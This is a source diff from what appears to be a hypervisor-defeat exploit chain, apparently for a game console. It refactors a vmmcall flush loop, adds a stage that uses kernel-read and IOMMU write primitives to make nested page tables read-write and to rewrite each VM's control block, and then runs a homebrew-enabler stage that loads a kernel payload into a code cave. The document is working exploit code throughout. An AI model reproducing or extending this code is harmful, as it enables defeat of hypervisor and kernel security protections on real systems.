@@ -460,8 +460,27 @@ extern "C" {
     extern uint64_t KELF_SZ;
 }
 
-int stage7_run_hen(hv_defeat_ctx *ctx) {
-    print("\n[stage7] hen\n");
+static int stage7_restore_npts(hv_defeat_ctx *ctx, iommu_ctx *iommu) {
+    printf("\n[stage7] NPTs - Remove XO, set RW and reenable them\n");
+
+    // Read CR3 from VM0, all VMs share the same paging
+    uint64_t NPT_CR3 = kr8(get_dmap_addr(ctx->vmcb_pas[0]+0xB0));
+
+    // Remove XO & Enable RW
+    walk_pages_and_set_RW(0, NPT_CR3);
+
+    // Restore NPT bit on VMs
+    for (int i=0 ; i<16 ; i++) {
+        uint64_t pa = ctx->vmcb_pas[i];
+        iommu_write8_pa(iommu, pa + 0x90, 0x0000000000000009ULL);
+        printf("  vmcb[%2d] NPT restored\n", i);
+        usleep(100);
+    }
+    return 0;
+}
+
+int stage8_run_hen(hv_defeat_ctx *ctx) {
+    print("\n[stage8] hen\n");
 
     uint64_t cave = fw_off(ctx->fw, "KERNEL_OFF_CODE_CAVE");
     if (!cave) {
@@ -495,6 +514,30 @@ int stage7_run_hen(hv_defeat_ctx *ctx) {
     print("  kexec returned 0x%x\n", ret);
 
     return ret;
+}
+
+static void flush_vms(void) {
+    static jmp_buf jmp_env;
+    static volatile int vmmcall_faulted;
+
+    auto old_handler = signal(SIGILL, [](int) {
+        vmmcall_faulted = 1;
+        longjmp(jmp_env, 1);
+    });
+
+    for (int i = 0; i < 16; i++) {
+        pin_to_core(i);
+        vmmcall_faulted = 0;
+
+        if (setjmp(jmp_env) == 0) {
+            asm volatile("vmmcall");
+        }
+
+        print("[vmmcall] core: %2d %s\n", i,
+            vmmcall_faulted ? "SIGILL (caught)" : "ok");
+    }
+
+    signal(SIGILL, old_handler);
 }
 
 int run_hv_defeat(void) {
@@ -540,29 +583,7 @@ int run_hv_defeat(void) {
    
     if ((r = stage3b_remove_xotext(&ctx))) return r;
 
-    {
-        static jmp_buf jmp_env;
-        static volatile int vmmcall_faulted;
-
-        auto old_handler = signal(SIGILL, [](int) {
-            vmmcall_faulted = 1;
-            longjmp(jmp_env, 1);
-        });
-
-        for (int i = 0; i < 16; i++) {
-            pin_to_core(i);
-            vmmcall_faulted = 0;
-
-            if (setjmp(jmp_env) == 0) {
-                asm volatile("vmmcall");
-            }
-
-            print("[vmmcall] core: %2d %s\n", i,
-                vmmcall_faulted ? "SIGILL (caught)" : "ok");
-        }
-
-        signal(SIGILL, old_handler);
-    }
+    flush_vms();
 
     kernel_pmap_invalidate_all();
 
@@ -574,7 +595,11 @@ int run_hv_defeat(void) {
 
     //clear_smap_smep_nda(&ctx);
 
-    stage7_run_hen(&ctx);
+    stage7_restore_npts(&ctx, &iommu);
+
+    flush_vms();
+
+    stage8_run_hen(&ctx);
 
     uint32_t fw_ver = kernel_get_fw_version();
     uint32_t fw_major = (fw_ver & 0xFF000000) >> 24;
